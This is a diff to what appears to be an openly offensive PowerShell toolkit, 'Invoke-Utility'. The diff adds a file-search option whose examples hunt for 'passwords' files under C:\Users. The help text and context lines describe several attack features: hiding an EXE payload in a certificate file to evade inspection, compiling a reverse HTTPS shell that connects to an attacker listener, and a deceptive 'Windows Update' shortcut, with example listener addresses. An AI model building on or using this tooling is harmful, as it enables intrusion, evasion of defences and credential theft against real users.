@@ -15,7 +15,7 @@ function Invoke-Utility {
 
 .PARAMETER NewCer
 
-	Generates a .cer certificate file with an "inactive" (no "MZ", "TVq" reference in the base64) payload section. This command should be invoked on attacker side, and certificate transferred to target via some other means. The certificate, should pass most inspection, and loads as a semi-valid certificate without any typical indicators of embedded payload. The resulting certificate can then be "decoded" and "activated" with the "-CerFile", "-Decode" and "-PayloadOut" parameters. Utilizes certutil.exe to encode and decode the certificate file.See example.
+	Generates a .cer certificate file with an "inactive" (no "MZ", "TVq" reference in the base64) EXE payload section. This command should be invoked on attacker side, and certificate transferred to target via some other means. The certificate, should pass most inspection, and loads as a semi-valid certificate without any typical indicators of embedded payload. The resulting certificate can then be "decoded" and "activated" with the "-CerFile", "-Decode" and "-PayloadOut" parameters. Utilizes certutil.exe to encode and decode the certificate file. See example. 
 	
 .PARAMETER TcpScan
 
@@ -40,7 +40,10 @@ function Invoke-Utility {
 	Compiles a reverse (PowerShell) HTTPS shell .NET executable (exe) in real-time using csc.exe and utilizes System.Management.Automation.dll for its functionality.
 	
 	Requires an SSL listener on the attacker-side.
+	
+.PARAMETER FindFile
 
+	Search for a file.
 	
 .EXAMPLE
 	
@@ -75,6 +78,11 @@ function Invoke-Utility {
 .EXAMPLE
 
 	Invoke-Utility -NewReverse -ListenerIp 192.168.0.1 -ListenerPort 443
+	
+.EXAMPLE
+
+	Invoke-Utility -FindFile -File passwords.doc -Path C:\Users
+	Invoke-Utility -FindFile -File passwords* -Path C:\Users
 	
 .NOTES
 
@@ -118,7 +126,12 @@ param (
 	[Parameter(Mandatory = $False)]
 	[Switch]$NewReverse,
 	[string]$ListenerIp2=[String]$ListenerIp,
-	[string]$ListenerPort2=[String]$ListenerPort
+	[string]$ListenerPort2=[String]$ListenerPort,
+	
+	[Parameter(Mandatory = $False)]
+	[Switch]$FindFile,
+	[string]$File2=[string]$File,
+	[String]$Path
 	
 )
 
@@ -191,7 +204,7 @@ $Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
  | -NewCer [-Payload] payload                                          |
  |---------------------------------------------------------------------|
 
-   [*] Description: Creates a .cer file containing a deactivated
+   [*] Description: Creates a .cer file containing a deactivated (exe)
        payload. Use the -Decode -CerFile and -PayloadOut parameters to 
        activate and drop the resulting payload. Utilizes certutil to encode
        and decode the certificate file.
@@ -240,6 +253,14 @@ $Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
      Reverse Shell requires an SSL-enabled listener.
 
  [*] Usage: Invoke-Utility -NewXuLiE -ListenerIp 192.168.1.2 -ListenerPort 443 -LnkName "Windows Update"
+ 
+ |----------------------------------------------------------------------|
+ | -FindFile -File file.txt -Path path                                  |
+ |----------------------------------------------------------------------|
+ 
+ [*] Description: Search for a file.
+
+ [*] Usage: Invoke-Utility -FindFile -File passwords.xls -Path C:\Users
    
  \---------------------------------------------------------------------/
    
@@ -258,6 +279,7 @@ $Z = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
  Invoke-Utility -NewXuLiE -ListenerIp 192.168.1.2 -ListenerPort 443 -LnkName "Windows Update"
  Invoke-Utility -NewPsDat
  Invoke-Utility -NewReverse -ListenerIp 192.168.13.1 -ListenerPort 443
+ Invoke-Utility -FindFile -File passwords.xls -Path C:\Users
 
 "@
 	}
@@ -665,5 +687,9 @@ while((`$x = `$sslStream.Read(`$bytes,0,`$bytes.Length)) -ne 0) {
 		Catch {
 			Write "Unknown Error."
 		}
+	}
+	elseif ($FindFile -and $File -and $Path) {
+		
+		Get-ChildItem -Path $Path -Filter $File -Recurse -ErrorAction SilentlyContinue -Force
 	}
 }
